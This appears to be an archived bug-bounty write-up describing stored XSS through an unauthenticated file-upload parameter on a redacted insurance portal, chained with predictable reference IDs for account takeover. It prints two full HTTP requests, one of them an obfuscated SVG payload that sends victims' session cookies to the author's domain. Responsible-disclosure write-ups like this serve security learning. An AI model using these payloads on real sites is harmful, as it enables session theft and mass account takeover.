# Hijacking Sessions with IDOR and XSS— @bxmbn

- **Source URL:** https://bxmbn.medium.com/hijacking-sessions-with-idor-and-xss-bxmbn-396f99761a85?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250223201020/https://bxmbn.medium.com/hijacking-sessions-with-idor-and-xss-bxmbn-396f99761a85?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/8875 (id 8875)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Picture a platform designed to handle sensitive documentation — think insurance claims or identity verification — turning into a goldmine for attackers. That’s what I stumbled into while exploring a file upload feature on an insurance-related portal. What began as a quick test ballooned into a cross-site scripting (XSS) vulnerability that could enable mass account takeovers. Let’s dive in.

# The Entry Point

The system let users upload files to back up their forms — a routine feature for this kind of platform. You’d submit a file, it’d get linked to a reference number (**refNo**) (say, **R2326400539** for a user we’ll call John), and later you could view it through a separate page:

https://\[redacted\].com/xxx.asp?refNo=**R2326400539**

Nothing fancy on the surface. But when I peeked at the upload request, I spotted a parameter called **fileUidList** — a string defining the file’s metadata. Curiosity kicked in: what if I messed with it?

I crafted a request, slipped an XSS payload into **fileUidList**, and tied it to a valid reference number, like **R2326400540** in the **njfbRefNo** Parameter. The server didn’t flinch — it swallowed my tampered upload whole.

# Lighting the Fuse

Here’s the request I used to trigger a simple alert

```
POST /[redacted]/[redacted].do HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------25285536543518840322221354714
Content-Length: 761
Origin: [redacted]
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
-----------------------------25285536543518840322221354714
Content-Disposition: form-data; name="njfbRefNo"
R2326400540
-----------------------------25285536543518840322221354714
Content-Disposition: form-data; name="actId"
-----------------------------25285536543518840322221354714
Content-Disposition: form-data; name="maxUploadContentSize"
104857601
-----------------------------25285536543518840322221354714
Content-Disposition: form-data; name="fileUidList"
10006630~!~/isoapps/a/unix/apps/WAS/FileService/files/[redacted]/2023/9/21~!~xss"><svg><set onbegin="d=document,b='`',d['loca'+'tion']='javascript:aler'+'t'+b+domain+b"> .png~!~649159
-----------------------------25285536543518840322221354714--
```
Server responded 200 Ok and the XSS payload was now saved into **refNo R2326400540**

https://\[redacted\].com/xxx.asp?refNo=R2326400540

# From XSS to Account Takeover

Since my malicious file was now stored under a user’s reference ID, it hit me: this could target anyone — past, present, or future users. Those reference numbers are numeric and predictable, so an attacker could hit them systematically. Even better (or worse), the session cookie — let’s call it **SESSIONID** — wasn’t flagged as HTTP-only, meaning JavaScript could snatch it.

I upped the ante with a new payload. This time, I set **fileUidList** to redirect the victim’s browser to a domain I controlled , appending their cookies to the URL. Here’s the request:

```
POST /[redacted]/[redacted].do HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------25285536543518840322221354714
Content-Length: 761
Origin: [redacted]
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
-----------------------------25285536543518840322221354714
Content-Disposition: form-data; name="njfbRefNo"
R2326400551
-----------------------------25285536543518840322221354714
Content-Disposition: form-data; name="actId"
-----------------------------25285536543518840322221354714
Content-Disposition: form-data; name="maxUploadContentSize"
104857601
-----------------------------25285536543518840322221354714
Content-Disposition: form-data; name="fileUidList"
10006630~!~/[redacted]/a/unix/apps/WAS/FileService/files/[redacted]/2023/9/21~!~xss"><svg><set onbegin="d=document,b='`',d['loca'+'tion']='//bxmbn.com/?'+b+cookie+b"> .png~!~649159
-----------------------------25285536543518840322221354714--
```
I uploaded it under **R2326400551**, loaded the view page, and checked my server. Sure enough, John’s **SESSIONID** landed in my logs. With that token, I could slip into his account — no password needed. Scale this across all users, and you’ve got a takeover spree.

# The Kicker: No Authentication Needed

Here’s the real shocker: the upload endpoint didn’t care if I was logged in. I could send these requests anonymously, injecting XSS into anyone’s files without ever authenticating. No session validation, no access checks — just an open invitation. That alone makes this a nightmare.

# The Fallout

The impact is brutal. With predictable IDs and no HTTP-only protection on the session cookie, an attacker could automate this — uploading malicious files across a swath of reference numbers, then waiting for victims to trip the wire. Every visit to the view page could hand over their session, paving the way for mass account takeovers. Stolen accounts, tampered data, or worse could follow.

The lack of authentication on the upload endpoint seals the deal. You don’t need an account to pull this off — just a connection and some reference IDs. And since future uploads inherit the same flaw, this could haunt the platform indefinitely.

# **Scoring the Damage**

Using the CVSS 3.1 calculator, this scores high: network-accessible, low complexity, no privileges required, user interaction needed, and a scope change leaking high-confidentiality data. Factor in the critical nature of the data involved, and it’s a top-tier issue.

# Final Thoughts

This flaw is a perfect storm of oversights: a missing authentication check, a stored XSS vector, and an exposed session cookie turned a standard upload system into an attacker’s playground. The thing here is that an attacker could also edited previous files of users, injecting XSS everyone’s files by just tampering the reference number Paremeter (**njfbRefNo)**

Now that I look back, and 5k bounty for this was to low of a bounty, giving that this company is one the biggest.

Thank you for reviewing this Writeup! . I will also be Answering any Questions in [https://x.com/bxmbn](https://web.archive.org/web/20250223201020/https://x.com/bxmbn)
